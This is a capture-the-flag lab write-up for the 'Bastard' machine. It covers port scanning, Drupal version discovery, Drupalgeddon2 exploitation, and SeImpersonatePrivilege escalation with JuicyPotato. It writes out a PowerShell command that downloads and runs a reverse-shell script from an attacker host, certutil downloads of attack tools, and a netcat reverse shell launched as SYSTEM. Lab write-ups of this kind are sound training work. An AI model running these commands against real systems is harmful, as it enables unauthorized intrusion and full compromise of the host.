## Bastard

Difficulty: Medium

### User Flag

```
rustscan -a 10.10.10.9 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/8d73ba33-dea5-4808-9861-b0893730d9b6)

<br>

Accessing port 80, we found ourselves with a Drupal site.

![drupalWebSite](https://github.com/b1d0ws/OSCP/assets/58514930/e35ebcb6-32be-4639-a14b-961a9334a8b6)

<br>

Discover it's version with the command below.

```
curl -s http://10.10.10.9/CHANGELOG.txt | grep -m2 ""
```

![drupalVersion](https://github.com/b1d0ws/OSCP/assets/58514930/1380d249-9738-4f14-b623-50a88a1c864e)

<br>

We can use [Drupalgeddon](https://github.com/dreadlocked/Drupalgeddon2) to get a webshell and give us a reverse with powershell and Invoke-PowerShellTcp.ps1.

```
ruby drupalgeddon2.rb http://10.10.10.9

powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/Invoke-PowerShellTcp.ps1')
```

![betterShell](https://github.com/b1d0ws/OSCP/assets/58514930/e284d3d1-404f-408d-92cf-c4727a0afb79)

<br>

### Root Flag

Enumerating privileges, our user has SeImpersonatePrivilege. 

```
whoami /priv
```

![whoamiPriv](https://github.com/b1d0ws/OSCP/assets/58514930/73f5d317-8e79-45cf-bc1d-fded6c3aa9cb)

<br>

We can abuse this with [JuicyPotato](https://juggernaut-sec.com/seimpersonateprivilege/).

```
# Checking OS Architecture
$Env:PROCESSOR_ARCHITECTURE

# Downloading binaries
cp /usr/share/windows-resources/binaries/nc.exe .
certutil -urlcache -f http://10.10.14.21/nc.exe nc.exe

certutil -urlcache -f http://10.10.14.21/JuicyPotatox86.exe JuicyPotatox86.exe

# Enumerating OS to get the right CLSID
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
https://ohpe.it/juicy-potato/CLSID/

.\JuicyPotatox86.exe -l 443 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c C:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.21 3333" -t *
```

![gettingRoot](https://github.com/b1d0ws/OSCP/assets/58514930/b9cff30a-d6ad-4ca0-a776-cef1ac08c55a)
